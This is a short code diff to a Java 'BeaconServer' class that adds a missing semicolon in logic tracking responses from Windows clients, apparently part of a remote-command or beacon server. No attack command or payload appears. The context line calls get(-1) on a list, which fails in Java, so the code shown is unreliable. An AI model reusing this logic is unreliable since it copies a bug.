@@ -173,7 +173,7 @@ public class BeaconServer implements Runnable{
                 if ((windowsClientResponses.get(ip).get(-1).equals("True")) && !windowsClientResponses.get(ip).contains("DISCONNECTED")){
                     // If responses contains the string we just send a command to get, then remove it, and give it true
                     ArrayList<String> tempList = windowsClientResponses.get(ip);
-                    tempList.remove("True")
+                    tempList.remove("True");
                     windowsClientResponses.put(ip, tempList);
                     clientStatus.put(ip, true);
                 } else {
